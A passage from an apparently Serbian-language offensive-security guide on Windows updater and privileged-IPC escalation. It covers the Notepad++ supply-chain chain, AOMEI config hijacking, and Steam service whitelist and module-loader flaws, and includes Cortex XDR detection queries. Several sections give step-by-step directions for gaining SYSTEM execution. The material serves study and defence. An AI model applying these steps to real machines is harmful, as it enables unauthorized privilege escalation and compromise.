   - **Bring-your-own signed binary + sideload**: uključite potpisani Bitdefender `BluetoothService.exe` i smestite zlonamerni `log.dll` na putanju pretrage. Kada se potpisani binarni fajl pokrene, Windows učitava `log.dll` bočnim učitavanjem; ona dešifruje i reflektivno učitava backdoor Chrysalis (zaštićen Warbird-om + heširanje API-ja radi otežavanja statičkog otkrivanja).
   - **Ubrizgavanje shellcode-a pomoću skripte**: NSIS izvršava kompajliranu Lua skriptu koja koristi Win32 API-je (npr. `EnumWindowStationsW`) za ubrizgavanje shellcode-a i pripremu Cobalt Strike Beacon-a.<sup>[[12]](#references)</sup>

Preporuke za ojačavanje/otkrivanje za svaki program za automatsko ažuriranje:
- Zahtevajte **proveru sertifikata i potpisa** preuzetog instalacionog programa (fiksirajte potpisnika proizvođača, odbijte nepodudaran CN/lanac) i potpisujte sam manifest ažuriranja (npr. XMLDSig). Blokirajte preusmeravanja određena manifestom ako nisu proverena.
- Tretirajte **sideloading potpisanog binarnog fajla koji donosi napadač** kao tačku za otkrivanje nakon preuzimanja: generišite upozorenje kada potpisani EXE proizvođača učita DLL sa putanje izvan svoje kanonske instalacione putanje (npr. Bitdefender učitava `log.dll` iz Temp/Downloads) i kada program za ažuriranje smesti/izvrši instalacione programe iz privremenih direktorijuma koji nemaju potpis proizvođača.
- Pratite **artefakte specifične za malver** uočene u ovom lancu (korisni kao opšti tragovi): mutex `Global\Jdhfv_1.0.1`, neuobičajeno upisivanje `gup.exe` u `%TEMP%` i faze ubrizgavanja shellcode-a pokrenute iz Lua-e.
- Notepad++ je odgovorio ojačavanjem WinGUp-a u verziji v8.8.9 i novijim: vraćeni XML je sada potpisan (XMLDSig), a novije verzije zahtevaju proveru sertifikata i potpisa preuzetog instalacionog programa, umesto da se oslanjaju samo na transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading potpisanog Bitdefender EXE-a <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ovi obrasci važe za svaki updater koji prihvata nepotpisane manifeste ili ne proverava potpisnike instalacionih programa — otmica mreže + zlonamerni instalacioni program + BYO-signed sideloading omogućavaju remote code execution pod izgovorom „pouzdanih“ ažuriranja.

### Konfiguracija obaveštenja kao drugi okidač ažuriranja

Updater može koristiti zasebne udaljene konfiguracije za **isporuku sadržaja i pokretanje njegovog izvršavanja**. Za to je potrebna kontrola nad konfiguracijama ili njihovim odgovorima; u izveštajima se ne navodi kako je ostvaren pristup izvoru. U slučaju AOMEI-ja, `down_html.ini` određivao je URL arhive, verziju (`thrid`) i MD5 (`Val`); napadač je povećao verziju i istovremeno promenio URL i odgovarajuću kontrolnu sumu. Ovo je [neuspeh granice poverenja metapodataka](#2-hijacking-the-update-channel-to-run-code-as-system) opisan iznad. Dodatni put za izvršavanje bio je `Notifycfg.ini`: usmeravao je `ABNotify.exe` da učita izdvojeni `upgrade-now.html` preko lokalnog URL-a `file:///` u WebView-u. Stranica je automatski navigirala do izvršne datoteke u istom direktorijumu, koju je WebView prosledio sistemskoj ljusci. Podređeni proces nasledio je privilegije programa za obaveštavanje; to samo po sebi nije podiglo njegove privilegije na SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google je takođe prijavio izmenjeni `Notifycfg.ini` sa više od 35.000 ponovljenih lažnih sekcija, kojima je zaobiđena uobičajena provera verzije ovog klijenta. Izveštaj ne dokazuje opšte zaobilaženje parsera. Napadač je vraćao udaljene datoteke nakon perioda od pet do deset minuta, tako da su izmenjenu konfiguraciju dobijali samo klijenti koji su proveravali ažuriranja tokom tih perioda. Ovaj kanal za obaveštenja prenosio je i zaseban [mam ac za WebDAV/NTLM coercion](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), za koji nije bilo potrebno izvršavanje arhive.<sup>[[18]](#references)</sup>

---
## Pokretanje privilegovanog IPC-a putem deljene memorije

Nemojte se zaustaviti na enumeraciji named pipe-ova. SYSTEM broker može da izloži dozvoljavajuće **file mapping** za uspostavljanje veze, a zatim da duplira handle-ove anonimnih pipe-ova u proces koji podnosi zahtev. U testiranom Steam dizajnu, `Global\SteamClientService_SharedMemFile` i `Global\SteamClientService_SharedMemLock` koordiniraju rukovanje klijentskim PID-om/događajem; servis vraća dva pipe handle-a, a naredni zahtevi sa prefiksom dužine koriste `RunInterface` (`0x01`). DACL za mapiranje dozvoljavao je klijente sa bilo kog nivoa integriteta. Interni objekat `CSteamServiceWin32` u `steamclient64.dll` pružao je praktičan klijent: razrešite globalnu promenljivu specifičnu za verziju, pozovite vtable slot 0 `Connect`, a zatim koristite mape interfejsa umesto ponovnog implementiranja rukovanja vezom. Pristup IPC-u je samo preduslov; odluka privilegovanog handler-a o poverenju određuje da li dolazi do eskalacije. <sup>[[19]](#references)[[20]](#references)</sup>

### Potpisani manifest proširuje se u zastarelu listu dozvoljenih izvršnih datoteka

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) proverava potpisani VDF-ov `kvsignatures`, ali beleži **proširenu putanju izvršne datoteke**, a ne nepromenljivi identitet datoteke. Uz potpisanu stavku `Run Process`, kao što je `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, navedite `%INSTALLDIR%` u koji korisnik može da upisuje. Postavite zamensku izvršnu datoteku na tu tačno proširenu putanju, a zatim pozovite `RunInstallScript` (slot 22) uz nepotpisani VDF čiji `Process 1` navodi putanju sa liste dozvoljenih. Stavka ostaje aktivna nakon izvršavanja potpisane skripte, sve do ponovnog pokretanja servisa; u prijavljenoj implementaciji nema ponovne provere datoteke pre pokretanja sa SYSTEM privilegijama. Ime postavljene datoteke mora odgovarati stvarnoj potpisanoj stavci, a ne samo kategoriji preduslova. <sup>[[19]](#references)[[20]](#references)</sup>

### Podređeni proces upravljača modula zaobilazi proveru potpisa pri direktnom učitavanju

`IClientModuleManager::LoadModule` (slot 0) prihvata bajtove modula kada se dostavljeni ID podudara sa njihovim CRC32. `CallFunctionAsync` (slot 3) sa `flags & 8` bira granu **podređenog procesa**, umesto grane direktnog reflektivnog učitavanja koja proverava Valve potpis. Servis upisuje `legacycompat\servicecall_<CRC>.dll` i pokreće `legacycompat\steamservice.exe /runfunc ...` iz instalacionog direktorijuma. Ako korisnik može da upisuje u taj direktorijum, postavite izvršnu datoteku na navedenu putanju, učitajte bilo koji privremeni modul koji odgovara CRC-u i pozovite asinhronu metodu sa postavljenim bitom 3. U prijavljenoj verziji nisu proveravani ni podređena izvršna datoteka ni DLL upisan na disk. Modul ne mora sam po sebi da bude funkcionalni payload: kao SYSTEM se pokreće zamenjena podređena izvršna datoteka. <sup>[[19]](#references)[[20]](#references)</sup>

### Provera članova kataloga pre privilegovane instalacije drajvera

Kod brokera za instalaciju drajvera proverite da li njegova validacija kataloga obuhvata **tačno onaj INF koji se prosleđuje instalacionom programu**. U prijavljenom toku `InstallVrLinkDongleDriver`, `WinVerifyTrust` proverava katalog, a `CryptCATAdminCalcHashFromFileHandle` traži *najmanje jednu* datoteku koja se podudara u direktorijumu koji je naveo pozivalac; međutim, servis zatim pokreće `pnputil /add-driver ... /install` nad `netrtwlanuval.inf`, a da prethodno nije utvrdio da je taj INF predviđeni član kataloga. Prihvata se ravna struktura direktorijuma ili struktura specifična za arhitekturu. Zato potpisani katalog sa bilo kojim članom iz navedenog direktorijuma koji se podudara može proći slabu proveru servisa, čak i ako se INF prosleđen privilegovanom instalacionom programu razlikuje. Nemojte pretpostaviti da ovo samo po sebi zaobilazi Windows-ovu politiku potpisivanja drajvera: uspešna instalacija i dalje zavisi od zamenskog paketa i politike hosta. <sup>[[19]](#references)[[20]](#references)</sup>

Servis oslobađa handle-ove za validaciju pre nego što `pnputil` otvori INF, čime nastaje [TOCTOU praznina](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) sa mestom za instalaciju drajvera umesto izvršnog ažuriranja. Oplock može da tempira zamenu između provere i otvaranja u instalacionom programu. Isti IPC izlaže i [prosleđivanje unosa na bezbednu radnu površinu](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring), uz zasebne preduslove za saglasnost. <sup>[[19]](#references)</sup>

## References
- [1] [Savetodavno obaveštenje – Netskope Client za Windows – Lokalna eskalacija privilegija putem lažnog servera (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope bezbednosno savetodavno obaveštenje NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope dodatak](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC klijent/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Hakovanje ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Lokalna eskalacija privilegija putem datoteka u Checkmk Agent u koje može da se upisuje](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Eskalacija privilegija u Windows agentu](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC-ovi](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Akteri pod pokroviteljstvom država iskorišćavaju lanac snabdevanja Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ažuriranje o incidentu sa otetom infrastrukturom](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Zaobilaženje ispravke za CVE-2025-0309 u Netskope Client za Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Otkrivanje grešaka u eskalaciji privilegija u Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Od gRPC-a do SYSTEM-a](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Kompromitovanje lanca snabdevanja AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group i Mandiant – Istraga o prolaznom neovlašćenom menjanju lanca snabdevanja](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Okretanje Valve-a](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – PoC-ovi za Turning the Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
